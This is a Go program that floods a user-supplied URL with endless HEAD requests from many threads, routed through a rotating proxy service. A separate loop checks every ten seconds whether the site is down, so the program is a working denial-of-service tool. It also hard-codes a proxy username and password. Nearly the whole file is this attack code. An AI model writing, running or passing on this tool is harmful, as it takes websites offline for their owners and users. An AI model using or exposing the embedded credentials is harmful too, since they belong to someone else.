package main

import (
	"fmt"
	"sync"
	"bufio"
	"os"
	"strconv"
	"strings"
	"time"
	"net"
	"encoding/base64"

	"github.com/valyala/fasthttp"
)

func main() {
	reader := bufio.NewReader(os.Stdin)
	fmt.Print("Enter URL: ")
	urlBytes, _, _ := reader.ReadLine()
	url := string(urlBytes)

	fmt.Print("Enter number of threads: ")
	threadBytes, _, _ := reader.ReadLine()
	numThreads, _ := strconv.Atoi(strings.TrimSpace(string(threadBytes)))

	var wg sync.WaitGroup
	wg.Add(numThreads)

	client := &fasthttp.Client{
		MaxIdleConnDuration: 10 * time.Second,
		ReadTimeout:         10 * time.Second,
		WriteTimeout:        10 * time.Second,
		MaxConnsPerHost:     100000,
                Dial: fasthttp.ProxyFunc(func(addr string) (conn net.Conn, err error) {
                    return fasthttp.DialTimeout("rp.proxyscrape.com:6060", time.Second*10)
                }),
	}

	for i := 0; i < numThreads; i++ {
		go func() {
			defer wg.Done()
			req := fasthttp.AcquireRequest()
			resp := fasthttp.AcquireResponse()
			defer func() {
				fasthttp.ReleaseRequest(req)
				fasthttp.ReleaseResponse(resp)
			}()

			req.Header.SetMethod("HEAD")
			req.SetRequestURI(url)

                        // Set proxy authentication details
                        req.Header.Set("Proxy-Authorization", "Basic " + base64.StdEncoding.EncodeToString([]byte("clo9sot4rdi2w5g:25b7fxehmcy65lv")))

			for {
				if err := client.Do(req, resp); err != nil && !strings.Contains(err.Error(), "i/o timeout") && !strings.Contains(err.Error(), "dialing to the given TCP address timed out") && !strings.Contains(err.Error(), "tls handshake timed out") {
					fmt.Println(err.Error())
				}
			}
		}()
	}

	go func() {
		reqStatus := fasthttp.AcquireRequest()
		respStatus := fasthttp.AcquireResponse()
		defer func() {
			fasthttp.ReleaseRequest(reqStatus)
			fasthttp.ReleaseResponse(respStatus)
		}()

		reqStatus.Header.SetMethod("GET")
		reqStatus.SetRequestURI(url)

                // Set proxy authentication details
                reqStatus.Header.Set("Proxy-Authorization", "Basic " + base64.StdEncoding.EncodeToString([]byte("clo9sot4rdi2w5g:25b7fxehmcy65lv")))

		for {
			time.Sleep(10 * time.Second)
			start := time.Now()
			err := client.Do(reqStatus, respStatus)
			duration := time.Since(start)
			if err != nil && !strings.Contains(err.Error(), "i/o timeout") && !strings.Contains(err.Error(), "dialing to the given TCP address timed out") && !strings.Contains(err.Error(), "tls handshake timed out") {
				fmt.Println("Website is down")
			} else {
				fmt.Printf("Website is up ( %.2f ms)\n", float64(duration.Milliseconds()))
			}
		}
	}()

	wg.Wait()
}
